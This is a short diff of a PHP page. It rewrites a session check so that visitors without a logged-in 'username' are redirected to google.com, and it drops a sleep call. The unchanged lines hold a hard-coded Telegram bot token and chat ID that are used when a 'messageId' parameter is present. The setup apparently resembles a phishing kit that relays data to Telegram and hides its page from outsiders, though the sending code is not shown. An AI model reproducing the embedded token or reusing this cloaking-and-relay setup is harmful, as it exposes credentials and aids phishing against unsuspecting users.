@@ -1,8 +1,11 @@
 <?php
-session_start();
-sleep(5);
-if(isset($_SESSION["username"])) {
+session_start(); // Start or resume the session
 
+if (!isset($_SESSION['username'])) {
+    // If the session variable 'username' is not set, redirect to Google
+    header('Location: https://google.com');
+    exit(); // Prevent further execution of the script
+}
 if(isset($_GET['messageId'])){
 $botToken = "6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk";
 $chatID = "1064643518";
@@ -1016,10 +1019,3 @@ border:0;
 </footer>
 </div><div id="quick-tools-container" style="display:none;"><div>
 </body></html>
-
-<?php
-}else {
-HEADER("Location: https://google.com");
-
-}
-?>
